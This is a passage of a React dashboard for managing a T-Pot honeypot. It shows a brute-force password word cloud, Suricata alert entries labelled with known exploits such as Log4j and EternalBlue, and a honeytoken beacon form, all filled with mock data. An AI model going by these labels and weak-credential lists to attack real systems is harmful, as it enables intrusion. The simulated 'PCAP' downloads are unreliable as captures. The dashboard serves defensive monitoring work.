                                    "px-3 py-1.5 text-[10px] font-black cursor-pointer transition-colors border-r border-gray-850 last:border-none",
                                    playbackSpeed === speed ? "bg-yellow-500 text-black font-black" : "text-gray-400 hover:text-white"
                                  )}
                                >
                                  {speed}x
                                </button>
                              ))}
                            </div>
                          </div>

                          {/* Step state counter */}
                          <span className="text-[10px] text-gray-500 font-bold bg-black/40 px-2 py-1 rounded border border-gray-900">
                            會話節點： {currentCmdStep} / {cowrieTerminalScript.length} Step
                          </span>

                        </div>

                      </div>

                    </div>

                    {/* Word cloud for credentials dictionary & stats */}
                    <div className="space-y-6">
                      
                      {/* Credential Word Cloud */}
                      <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-5">
                        <span className="text-xs font-black text-white uppercase tracking-wider font-mono block mb-3 border-b border-gray-900 pb-2">
                          暴力破解熱門密碼字典雲 (Credentials Brute Force Cloud)
                        </span>
                        <p className="text-[10px] text-gray-500 font-mono mb-4 leading-relaxed">
                          由 Cowrie 偽裝 SSH 登錄接口自動收集到的暴力破解常用帳密特徵，點擊可以將其同步覆蓋至 T-Pot 誘捕阻攔權重中：
                        </p>

                        <div className="bg-black/40 border border-gray-900 rounded-xl p-4 min-h-[160px] flex flex-wrap gap-2.5 justify-center items-center">
                          {[
                            { word: 'root', weight: 'text-xl text-[#FF3366] font-black', count: '14,240 試' },
                            { word: 'admin', weight: 'text-lg text-amber-400 font-extrabold', count: '9,812 試' },
                            { word: '123456', weight: 'text-base text-yellow-400 font-extrabold', count: '8,410 試' },
                            { word: 'password', weight: 'text-sm text-blue-400 font-bold', count: '5,023 試' },
                            { word: 'support', weight: 'text-xs text-emerald-400 font-semibold', count: '1,421 試' },
                            { word: 'oracle', weight: 'text-[11px] text-gray-400 font-medium', count: '840 試' },
                            { word: 'ubuntu', weight: 'text-sm text-indigo-400 font-bold', count: '3,011 試' },
                            { word: 'guest', weight: 'text-xs text-purple-400 font-semibold', count: '1,280 試' },
                            { word: 'root123', weight: 'text-sm text-yellow-500 font-bold', count: '2,420 試' }
                          ].map(tag => (
                            <button
                              key={tag.word}
                              onClick={() => {
                                showToast(`已設定蜜罐欺敵字典規則：優先回應 '${tag.word}' 登密特徵以延長黑客留存時間，並開始高精度 TTY 終端監聽紀錄。`, 'success');
                              }}
                              className={cn(
                                "transition-all cursor-pointer hover:scale-110 duration-200 outline-none select-none bg-black/60 px-2 py-1 rounded border border-gray-900 hover:border-yellow-500/30",
                                tag.weight
                              )}
                              title={tag.count}
                            >
                              {tag.word} <sup className="text-[9px] text-gray-500 font-normal">{tag.count}</sup>
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Bruteforce stats quick diagnostic */}
                      <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-5">
                        <span className="text-xs font-black text-white uppercase tracking-wider font-mono block mb-3 border-b border-gray-900 pb-2">
                          SSH/Telnet 脅迫阻截規則統計
                        </span>
                        
                        <div className="grid grid-cols-2 gap-4 text-center font-mono text-[10px]">
                          <div className="p-3.5 bg-black/40 rounded-xl border border-gray-900">
                            <span className="text-gray-500 font-bold uppercase block mb-1">本日破解發起 IPs:</span>
                            <span className="text-xs font-black text-[#FF3366]">1,284 Unique</span>
                          </div>
                          <div className="p-3.5 bg-black/40 rounded-xl border border-gray-900">
                            <span className="text-gray-500 font-bold uppercase block mb-1">平均登陸測試留存:</span>
                            <span className="text-xs font-black text-emerald-400">4 分 12 秒</span>
                          </div>
                        </div>
                      </div>

                    </div>

                  </div>

                </div>
              )}

            </div>
          )}

          {/* TAB G: SURICATA NETWORK PACKET FORENSICS (PCAP DOWNLOADER) */}
          {activeTab === 'pcap' && (
            <div className="space-y-6 animate-fadeIn">
              
              {/* Forensics warning banner */}
              <div className="bg-blue-500/10 border border-blue-500/30 rounded-2xl p-4 flex items-center justify-between gap-4">
                <div className="flex items-center gap-3">
                  <Activity className="text-blue-400 w-5 h-5 flex-shrink-0 animate-pulse" />
                  <div>
                    <span className="text-xs font-black text-blue-300 block">Suricata IDS 全流量封包錄製監測中</span>
                    <span className="text-[10px] text-blue-400/80 font-mono mt-0.5 block">
                      整合 TCPDump 常駐守護進程，自動快照高危反向 Shell 及 Web Shell exploit 流活動。
                    </span>
                  </div>
                </div>
              </div>

              {/* Main table card */}
              <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-64 h-64 bg-blue-500/2 rounded-full blur-3xl pointer-events-none"></div>

                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-gray-900 pb-4 mb-6">
                  <div>
                    <h3 className="text-sm font-black tracking-widest text-white flex items-center gap-2">
                      <Binary className="text-blue-400" size={16} />
                      {getLoc('pcap_title')}
                    </h3>
                    <p className="text-[10px] text-gray-500 font-mono mt-0.5 max-w-2xl leading-relaxed font-semibold">
                      {getLoc('pcap_desc')}
                    </p>
                  </div>
                </div>

                {/* PCAP table search filter */}
                <div className="mb-4">
                  <input
                    type="text"
                    placeholder="搜尋高危規則、特定的漏洞特徵或來源攻擊 IP..."
                    onChange={(e) => {
                      const term = e.target.value.toLowerCase();
                      if (!term) {
                        setPcapEvents([
                          { id: 'PCAP-001', time: '11:06:45', rule: 'Log4j Enterprise Exploit Exploit (CVE-2021-44228)', ip: '43.239.58.41', size: '24.8 KB' },
                          { id: 'PCAP-002', time: '11:05:41', rule: 'EternalBlue SMB Remote Exploit Probing (MS17-010)', ip: '103.44.122.5', size: '156.4 KB' },
                          { id: 'PCAP-003', time: '10:48:12', rule: 'Apache Struts2 Command Injection Execution (CVE-2017-5638)', ip: '185.195.233.102', size: '42.1 KB' },
                          { id: 'PCAP-004', time: '09:24:50', rule: 'Redis Unauthorized Direct Access execution', ip: '124.8.42.155', size: '8.5 KB' },
                          { id: 'PCAP-005', time: '08:12:30', rule: 'Spring4Shell Payload delivery Remote Code Execution (CVE-2022-22965)', ip: '92.41.115.8', size: '78.2 KB' }
                        ]);
                      } else {
                        setPcapEvents(prev => prev.filter(x => 
                          x.rule.toLowerCase().includes(term) || 
                          x.ip.toLowerCase().includes(term)
                        ));
                      }
                    }}
                    className="w-full max-w-md px-3.5 py-1.5 bg-black border border-gray-850 hover:border-gray-850 focus:border-blue-400/50 rounded-xl text-xs text-white outline-none transition-all font-mono"
                  />
                </div>

                {/* Render PCAP table ledger */}
                <div className="overflow-x-auto rounded-xl border border-gray-850">
                  <table className="w-full text-left text-xs text-gray-300">
                    <thead className="bg-[#10141f] border-b border-gray-800 text-gray-400 font-bold uppercase text-[10px] tracking-wider font-mono">
                      <tr>
                        <th className="p-4 w-12 text-center">詳細</th>
                        <th className="p-4">{getLoc('tbl_pcap_time')}</th>
                        <th className="p-4">{getLoc('tbl_pcap_rule')}</th>
                        <th className="p-4">{getLoc('tbl_pcap_ip')}</th>
                        <th className="p-4">{getLoc('tbl_pcap_size')}</th>
                        <th className="p-4 text-center">{getLoc('tbl_pcap_action')}</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-850 font-mono text-[11px]">
                      {pcapEvents.map((item) => {
                        const isExpanded = expandedPcapId === item.id;
                        const details = PCAP_DETAILS[item.id] || {
                          destPort: 'Unknown',
                          protocol: 'TCP',
                          severity: 'High',
                          payloadDecoded: 'N/A',
                          hexdump: '',
                          intelRisk: '80/100',
                          description: 'Decrypted packet trace stream.'
                        };

                        return (
                          <React.Fragment key={item.id}>
                            <tr 
                              onClick={() => {
                                setExpandedPcapId(isExpanded ? null : item.id);
                              }}
                              className={cn(
                                "hover:bg-gray-900/30 transition-colors cursor-pointer border-l-2",
                                isExpanded ? "bg-[#0b0c10] border-l-blue-500" : "border-l-transparent"
                              )}
                            >
                              <td className="p-4 text-center">
                                {isExpanded ? (
                                  <ChevronUp size={14} className="text-blue-400 mx-auto transition-transform" />
                                ) : (
                                  <ChevronDown size={14} className="text-gray-400 hover:text-white mx-auto transition-transform" />
                                )}
                              </td>
                              <td className="p-4 text-gray-500 font-black">{item.time}</td>
                              <td className="p-4 text-gray-200 font-semibold">{item.rule}</td>
                              <td className="p-4" onClick={(e) => e.stopPropagation()}>
                                <span className="text-white font-bold select-all">{item.ip}</span>
                              </td>
                              <td className="p-4 text-blue-400 font-black">{item.size}</td>
                              <td className="p-4 text-center" onClick={(e) => e.stopPropagation()}>
                                <button
                                  onClick={() => {
                                    showToast(`發送對接協議：正向 T-Pot IDS 調用主機封包庫 [ID: ${item.id}] ...`, 'info');
                                    setTimeout(() => {
                                      const content = `Captured PCAP Header: ${item.rule}\nTimestamp: ${item.time}\nSource IP Address: ${item.ip}\nPacket Size: ${item.size}\nBytes Stream: [00 ff c2 e6 a9 eb bd 92 88 a1 10 f4 1c 38 dd f2 aa aa]\nAnalysis status: READY for Wireshark Inquest.`;
                                      const element = document.createElement("a");
                                      const file = new Blob([content], { type: 'application/octet-stream' });
                                      element.href = URL.createObjectURL(file);
                                      element.download = `${item.id.toLowerCase()}_suricata_capture.pcap`;
                                      document.body.appendChild(element);
                                      element.click();
                                      document.body.removeChild(element);
                                      showToast(`封包 ${item.id} 下載完畢！大小：${item.size}，現在可在 Wireshark 中打開`, 'success');
                                    }, 800);
                                  }}
                                  className="px-3 py-1.5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white rounded-lg text-[10px] font-bold transition-all cursor-pointer flex items-center gap-1 mx-auto"
                                >
                                  <Download size={11} />
                                  <span>{getLoc('btn_pcap_download')}</span>
                                </button>
                              </td>
                            </tr>

                            {isExpanded && (
                              <tr className="bg-black/40">
                                <td colSpan={6} className="p-5 border-t border-gray-900 bg-[#07090d]/50">
                                  <motion.div
                                    initial={{ opacity: 0, height: 0 }}
                                    animate={{ opacity: 1, height: 'auto' }}
                                    className="grid grid-cols-1 xl:grid-cols-3 gap-6 text-left selection:bg-blue-500/30"
                                  >
                                    {/* Left Pane: Flow attributes */}
                                    <div className="space-y-4">
                                      <div className="flex items-center gap-2 border-b border-gray-900 pb-2">
                                        <Layers size={13} className="text-blue-400" />
                                        <span className="text-[11px] font-black text-white uppercase tracking-wider font-mono">流屬性元數據 (Flow Metadata)</span>
                                      </div>

                                      <div className="space-y-2.5 font-mono text-[10px]">
                                        <div className="flex items-center justify-between py-1 border-b border-gray-900/45">
                                          <span className="text-gray-500 font-bold">目的地通訊埠:</span>
                                          <span className="text-gray-300 font-black">{details.destPort}</span>
                                        </div>
                                        <div className="flex items-center justify-between py-1 border-b border-gray-900/45">
                                          <span className="text-gray-500 font-bold">協議類型:</span>
                                          <span className="text-gray-300 font-black">{details.protocol}</span>
                                        </div>
                                        <div className="flex items-center justify-between py-1 border-b border-gray-900/45">
                                          <span className="text-gray-500 font-bold">脅迫級別:</span>
                                          <span className={cn(
                                            "px-1.5 py-0.5 rounded text-[9px] font-black uppercase",
                                            details.severity === 'Critical' ? "bg-red-500/15 text-red-400 border border-red-500/20" : "bg-amber-500/15 text-amber-400 border border-amber-500/20"
                                          )}>
                                            {details.severity}
                                          </span>
                                        </div>
                                        <div className="flex items-center justify-between py-1 border-b border-gray-900/45">
                                          <span className="text-gray-500 font-bold">威脅信譽權限:</span>
                                          <span className="text-red-400 font-black">{details.intelRisk}</span>
                                        </div>
                                      </div>

                                      <div className="p-3 rounded-xl bg-gray-900/30 border border-gray-850/40 space-y-1.5 font-mono text-[10px] leading-relaxed">
                                        <span className="text-gray-500 font-bold block">深度威脅分析 (Threat Impact Analysis):</span>
                                        <p className="text-gray-400 font-medium">{details.description}</p>
                                      </div>
                                    </div>

                                    {/* Middle Pane: Decoded payload */}
                                    <div className="space-y-3">
                                      <div className="flex items-center justify-between border-b border-gray-900 pb-2">
                                        <div className="flex items-center gap-2">
                                          <Binary size={13} className="text-blue-400" />
                                          <span className="text-[11px] font-black text-white uppercase tracking-wider font-mono">解碼特徵載荷 (Decoded Payload)</span>
                                        </div>
                                        <button
                                          onClick={(e) => {
                                            e.stopPropagation();
                                            navigator.clipboard.writeText(details.payloadDecoded);
                                            showToast('已複製解碼特徵載荷到剪貼簿', 'success');
                                          }}
                                          className="text-[9px] text-[#FF3366] font-bold hover:underline"
                                        >
                                          複製
                                        </button>
                                      </div>
                                      <div className="bg-black/90 border border-gray-900 rounded-xl p-3 h-40 overflow-y-auto font-mono text-[10px] text-red-400 select-all border-l-2 border-l-rose-500/50 whitespace-pre-wrap leading-relaxed">
                                        {details.payloadDecoded}
                                      </div>
                                    </div>

                                    {/* Right Pane: Hexdump */}
                                    <div className="space-y-3">
                                      <div className="flex items-center justify-between border-b border-gray-900 pb-2">
                                        <div className="flex items-center gap-2">
                                          <Hash size={13} className="text-blue-400" />
                                          <span className="text-[11px] font-black text-white uppercase tracking-wider font-mono">封包流十六進制 (Hexdump)</span>
                                        </div>
                                        <span className="text-[9px] text-gray-500">Wireshark formatting</span>
                                      </div>
                                      <div className="bg-black/95 border border-gray-900 rounded-xl p-3 h-40 overflow-y-auto font-mono text-[9px] text-emerald-400 select-all leading-relaxed whitespace-pre font-bold">
                                        {details.hexdump}
                                      </div>
                                    </div>
                                  </motion.div>
                                </td>
                              </tr>
                            )}
                          </React.Fragment>
                        );
                      })}
                    </tbody>
                  </table>
                </div>

              </div>

            </div>
          )}

          {/* TAB H: HONEYTOKEN ACTIVE DECEPTION MANAGEMENT (HONEYTOKEN INLINE CONTROL) */}
          {activeTab === 'honeytoken' && (
            <div className="space-y-6 animate-fadeIn">
              
              {/* Honeytokens Warning/Explanation banner */}
              <div className="bg-amber-500/10 border border-amber-500/30 rounded-2xl p-4 flex items-center justify-between gap-4">
                <div className="flex items-center gap-3">
                  <Flame className="text-amber-500 w-5 h-5 flex-shrink-0 animate-pulse" />
                  <div>
                    <span className="text-xs font-black text-amber-300 block">Honeytoken 欺敵主動誘騙誘補防線</span>
                    <span className="text-[10px] text-amber-400/80 font-mono mt-0.5 block">
                      放置假檔案或虛擬 Linux 身分資料夾（如 config、salary 列表）。黑客下載打開時將引發即時信標，反向採集黑客真正的 IP 地址。
                    </span>
                  </div>
                </div>
              </div>

              {/* Main table card */}
              <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-64 h-64 bg-amber-500/2 rounded-full blur-3xl pointer-events-none"></div>

                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-gray-900 pb-4 mb-6">
                  <div>
                    <h3 className="text-sm font-black tracking-widest text-white flex items-center gap-2">
                      <Database className="text-amber-400" size={16} />
                      {getLoc('honeytoken_title')}
                    </h3>
                    <p className="text-[10px] text-gray-500 font-mono mt-0.5 max-w-2xl leading-relaxed">
                      {getLoc('honeytoken_desc')}
                    </p>
                  </div>

                  <button
                    onClick={() => setShowAddHoneytoken(!showAddHoneytoken)}
                    className="px-4 py-2 bg-gradient-to-r from-amber-500 to-yellow-500 hover:from-amber-400 hover:to-yellow-400 text-gray-950 text-xs font-black rounded-xl flex items-center gap-1.5 cursor-pointer shadow-lg shadow-amber-500/10 transition-all font-mono"
                  >
                    <Plus size={13} />
                    <span>{getLoc('honeytoken_add_btn')}</span>
                  </button>
                </div>

                {/* Expanded Deploy Honeytoken form (Inline) */}
                {showAddHoneytoken && (
                  <motion.div 
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    exit={{ opacity: 0, height: 0 }}
                    className="bg-black/40 border border-gray-850 rounded-2xl p-5 mb-6 space-y-4 relative overflow-hidden"
                  >
                    <h4 className="text-xs font-black text-white uppercase tracking-wider">配製新增誘訊設定檔 (Deploy Honeytoken Details)</h4>
                    <p className="text-[10px] text-gray-500 font-mono leading-relaxed">
                      請設定符合蜜罐部署情境的機密檔名稱，例如：`/var/www/html/wp-includes/salary_manifest.xml`。系統將實時嵌入 Tracker JS/Macro Beacon 信標程式。
                    </p>
                    
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                      <div>
                        <label className="text-[9px] font-bold text-gray-400 uppercase block mb-1">檔案檔名名稱 (例如 passwords.txt)</label>
                        <input
                          type="text"
                          value={newTokenName}
                          onChange={(e) => setNewTokenName(e.target.value)}
                          placeholder="db_config.php"
                          className="w-full bg-black border border-gray-800 hover:border-gray-700 focus:border-amber-400/50 rounded-xl p-2.5 text-xs text-white outline-none font-mono tracking-wider transition-all"
                        />
                      </div>
                      <div>
                        <label className="text-[9px] font-bold text-gray-400 uppercase block mb-1">部署相對虛擬路徑 (e.g. /etc/config/)</label>
                        <input
                          type="text"
                          value={newTokenPath}
                          onChange={(e) => setNewTokenPath(e.target.value)}
                          placeholder="/var/www/html/"
                          className="w-full bg-black border border-gray-800 hover:border-gray-700 focus:border-amber-400/50 rounded-xl p-2.5 text-xs text-white outline-none font-mono transition-all"
                        />
                      </div>
                      <div>
                        <label className="text-[9px] font-bold text-gray-400 uppercase block mb-1">預設觸發網頁回報 Webhook Endpoint</label>
                        <input
                          type="text"
                          value={newWebhookUrl}
                          onChange={(e) => setNewWebhookUrl(e.target.value)}
                          placeholder="https://beacon-tpot.corp/trigger/tok"
                          className="w-full bg-black border border-gray-800 hover:border-gray-700 focus:border-amber-400/50 rounded-xl p-2.5 text-xs text-white outline-none font-mono transition-all"
                        />
                      </div>
                    </div>

                    <div className="flex justify-end gap-2 pt-2 border-t border-gray-900">
                      <button
                        onClick={() => {
                          setShowAddHoneytoken(false);
                          setNewTokenName('');
                          setNewTokenPath('');
                          setNewWebhookUrl('');
                        }}
                        className="px-3 py-1.5 bg-gray-900 border border-gray-800 hover:bg-gray-850 text-gray-400 rounded-lg text-[10px] font-bold cursor-pointer transition-all"
                      >
                        取消關閉
                      </button>
                      <button
                        onClick={() => {
                          if (!newTokenName || !newTokenPath) {
                            showToast('檔名與路徑為必填欄位！', 'warning');
                            return;
                          }
                          const nextId = `HT-00${honeytokens.length + 1}`;
                          const customWebhook = newWebhookUrl || `https://beacon-tpot.corp/trigger/tok-${nextId.toLowerCase()}`;
                          const freshToken: Honeytoken = {
                            id: nextId,
                            name: newTokenName,
                            path: newTokenPath,
                            url: customWebhook,
                            downloads: 0,
                            created: new Date().toISOString().slice(0, 16).replace('T', ' ')
                          };
                          setHoneytokens(prev => [...prev, freshToken]);
                          
                          // Push an audit compliance history
                          const mockAudit: AuditLogItem = {
                            id: `AUD-${Date.now().toString().slice(-3)}`,
                            time: new Date().toTimeString().split(' ')[0],
                            actor: currentUserRole === 'Admin' ? 'Admin A' : 'Analyst B',
                            action: `Created honeytoken ${newTokenName} at path ${newTokenPath}`,
                            target: 'Deception Honeytoken DB',
                            result: 'Success',
                            severity: 'Medium'
                          };
                          setAuditLogs(prev => [mockAudit, ...prev]);

                          showToast(`欺敵 Honeytoken '${newTokenName}' 回報點部署成功。`, 'success');
                          
                          // Reset inputs
                          setNewTokenName('');
                          setNewTokenPath('');
                          setNewWebhookUrl('');
                          setShowAddHoneytoken(false);
                        }}
                        className="px-4 py-1.5 bg-amber-500 hover:bg-amber-400 text-gray-950 rounded-lg text-[10px] font-black cursor-pointer transition-all font-mono"
                      >
                        確認部署 Honeytoken
                      </button>
                    </div>

                  </motion.div>
                )}

                {/* Render Honeytokens list */}
                <div className="overflow-x-auto rounded-xl border border-gray-850">
                  <table className="w-full text-left text-xs text-gray-300">
                    <thead className="bg-[#10141f] border-b border-gray-800 text-gray-400 font-bold uppercase text-[10px] tracking-wider font-mono">
                      <tr>
                        <th className="p-4">{getLoc('tbl_ht_name')}</th>
                        <th className="p-4">{getLoc('tbl_ht_path')}</th>
                        <th className="p-4">{getLoc('tbl_ht_url')}</th>
                        <th className="p-4 text-center">{getLoc('tbl_ht_downloads')}</th>
                        <th className="p-4">{getLoc('tbl_ht_created')}</th>
                        <th className="p-4 text-center">{getLoc('tbl_ht_actions')}</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-850 font-mono text-[11px]">
                      {honeytokens.map((token) => (
                        <tr key={token.id} className="hover:bg-gray-900/30 transition-colors">
                          <td className="p-4">
                            <div className="flex items-center gap-1.5">
                              <span className="text-[#FFCC00] font-black">📄</span>
                              <span className="text-white font-bold">{token.name}</span>
                            </div>
                          </td>
                          <td className="p-4 text-gray-400 font-semibold">{token.path}</td>
                          <td className="p-4 text-gray-500 text-[10px] select-all">{token.url}</td>
                          <td className="p-4 text-center">
                            <span className={cn(
                              "text-xs px-2 py-0.5 rounded-full font-black",
                              token.downloads > 0 ? "bg-rose-500/15 text-rose-400" : "bg-gray-850 text-gray-500"
                            )}>
                              {token.downloads} 次觸發
                            </span>
                          </td>
                          <td className="p-4 text-gray-500">{token.created}</td>
                          <td className="p-4 text-center">
                            <div className="flex justify-center gap-2">
                              {/* Simulate hacker download triggers beacon */}
                              <button
                                onClick={() => {
                                  // Increment trigger downloads count
                                  setHoneytokens(prev => prev.map(x => x.id === token.id ? { ...x, downloads: x.downloads + 1 } : x));
                                  // Trigger alarm beep and show toast reporting hacker IP physical tracking data
                                  const randomHackerIp = `${12 + Math.floor(Math.random() * 200)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.88`;
                                  showToast(`🚨【蜜罐信標警報】惡意來源 IP ${randomHackerIp} 在讀取了 ${token.name} 檔案後，觸發 HTTP Beacon 信標！防護鏈已收集環境 UUID 及主機特徵。`, 'danger');
                                }}
                                className="px-2 py-1 bg-[#ff4757]/10 hover:bg-[#ff4757]/20 border border-[#ff4757]/30 text-[#ff4757] rounded-lg text-[9px] font-bold cursor-pointer transition-all"
                                title="模擬黑客觸發下載信標流程"
                              >
                                模擬觸發下載
                              </button>
                              
                              <button
                                onClick={() => {
                                  setHoneytokens(prev => prev.filter(x => x.id !== token.id));
                                  showToast(`已成功移除 ${token.name} 檔案信標配置。`, 'warning');
                                }}
                                className="text-gray-500 hover:text-red-400 text-[10px] transition-colors cursor-pointer"
                              >
                                {getLoc('tbl_ht_remove')}
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>

              </div>

            </div>
          )}

        </main>

      </div>

      {/* FOOTER SECTION BRANDING */}
      <footer className="mt-12 text-center border-t border-gray-850 pt-6">
        <p className="text-[10px] text-gray-500 font-mono uppercase tracking-widest">
          T-Pot Honeypot & Attack Map Management Module • Developed for Security Analyst Operations
        </p>
        <p className="text-[9px] text-gray-600 font-mono mt-1">
          Authorized to Cyber Command Tier 3 Specialist Operations Group.
        </p>
      </footer>

      {/* SIMULATED SHELL TERMINAL MODAL POPUP */}
      <AnimatePresence>
        {showTerminalModal && terminalNode && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="bg-[#0b0e14] border border-[#10B981]/50 rounded-2xl w-full max-w-3xl overflow-hidden shadow-2xl shadow-[#10B981]/5 flex flex-col h-[500px]"
            >
              {/* Modal header */}
              <div className="bg-black/60 border-b border-gray-900 px-5 py-3 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <TerminalIcon className="text-[#10B981] animate-pulse" size={16} />
                  <span className="text-xs uppercase font-black font-mono text-[#10B981]">
                     Interactive Container Agent Terminal Shell: <span className="text-white select-all">{terminalNode.name}</span>
                  </span>
                </div>
                <button
                  onClick={() => setShowTerminalModal(false)}
                  className="text-gray-500 hover:text-white font-black text-sm select-none cursor-pointer"
                >
                  ✕
                </button>
              </div>

              {/* Terminal Logs area */}
              <div className="flex-1 bg-black p-5 font-mono text-xs text-[#00FF66] overflow-y-auto space-y-1 selectable-area select-text">
                {terminalLogs.map((logStr, idx) => (
                  <div key={idx} className="whitespace-pre-wrap leading-relaxed">
                    {logStr}
                  </div>
                ))}
              </div>

              {/* Terminal command input bar */}
              <form onSubmit={handleTerminalSubmit} className="bg-black border-t border-gray-900 p-3 flex items-center gap-2">
                <span className="text-[#00FF66] font-mono text-xs pl-2 select-none">
                  tpot-guest@{terminalNode.name.toLowerCase()}:~$
                </span>
                <input 
                  type="text"
                  value={terminalInput}
                  onChange={(e) => setTerminalInput(e.target.value)}
                  className="flex-1 bg-transparent border-none text-[#00FF66] font-mono text-xs outline-none pl-1 select-text"
                  placeholder="輸入指令 (如 tpothelp, docker-ps, log-tail)..."
                  autoFocus
                />
              </form>

            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* REGISTER NEW T-POT SENSOR MODAL POPUP */}
      <AnimatePresence>
        {showAddNodeModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="bg-[#0d1017] border border-gray-800 rounded-2xl w-full max-w-md overflow-hidden shadow-2xl"
            >
              <div className="bg-[#10141f] border-b border-gray-850 px-5 py-4 flex items-center justify-between">
                <span className="text-xs font-black uppercase text-white tracking-widest font-mono">
                  登錄全新 T-Pot 物理蜜罐節點 / 傳感器
                </span>
                <button onClick={() => setShowAddNodeModal(false)} className="text-gray-500 hover:text-white font-mono cursor-pointer">✕</button>
              </div>

              <form onSubmit={handleAddNewNode} className="p-5 space-y-4">
                
                <div>
                  <label className="text-[10px] font-black text-gray-500 uppercase tracking-wider block mb-1">蜜罐探針節點名稱</label>
                  <input 
                    type="text" 
                    placeholder="例如: SENSOR-APAC-TOKYO"
                    value={newNodeName}
                    onChange={(e) => setNewNodeName(e.target.value)}
                    className="w-full bg-black border border-gray-800 focus:border-red-500/50 rounded-xl p-2.5 text-xs text-white outline-none font-bold"
                  />
                </div>

                <div>
                  <label className="text-[10px] font-black text-gray-500 uppercase tracking-wider block mb-1">節點主機 IPv4 地址</label>
                  <input 
                    type="text" 
                    placeholder="例如: 13.230.155.42"
                    value={newNodeIp}
                    onChange={(e) => setNewNodeIp(e.target.value)}
                    className="w-full bg-black border border-gray-800 focus:border-red-500/50 rounded-xl p-2.5 text-xs text-white outline-none font-mono font-bold"
                  />
                </div>

                <div>
                  <label className="text-[10px] font-black text-gray-500 uppercase tracking-wider block mb-1">節點架構角色分工</label>
                  <div className="grid grid-cols-2 gap-3 mt-1 mr-2">
                    <button
                      type="button"
                      onClick={() => setNewNodeType('SENSOR')}
                      className={cn(
                        "p-2.5 rounded-xl border text-xs font-black uppercase transition-all cursor-pointer",
                        newNodeType === 'SENSOR' 
                          ? "bg-blue-500/10 text-blue-400 border-blue-500/30" 
                          : "bg-black border-gray-800 text-gray-500"
                      )}
                    >
                      SENSOR (輕量探針)
                    </button>
                    <button
                      type="button"
                      onClick={() => setNewNodeType('HIVE')}
                      className={cn(
                        "p-2.5 rounded-xl border text-xs font-black uppercase transition-all cursor-pointer",
                        newNodeType === 'HIVE' 
                          ? "bg-purple-500/10 text-purple-400 border-purple-500/30" 
                          : "bg-black border-gray-800 text-gray-500"
                      )}
                    >
                      HIVE (重度儲存集群)
                    </button>
                  </div>
                </div>

                <div className="pt-4 border-t border-gray-900 flex justify-end gap-2">
                  <button
                    type="button"
                    onClick={() => setShowAddNodeModal(false)}
                    className="px-4 py-2 bg-gray-950 hover:bg-gray-900 border border-gray-850 text-xs font-bold text-gray-400 hover:text-white rounded-xl cursor-pointer"
                  >
                    取消
                  </button>
                  <button
                    type="submit"
                    className="px-4 py-2 bg-gradient-to-r from-red-650 to-rose-600 hover:from-red-600 text-xs font-bold text-white rounded-xl cursor-pointer"
                  >
                    立即註冊並同步設定
                  </button>
                </div>

              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

    </div>
  );
}
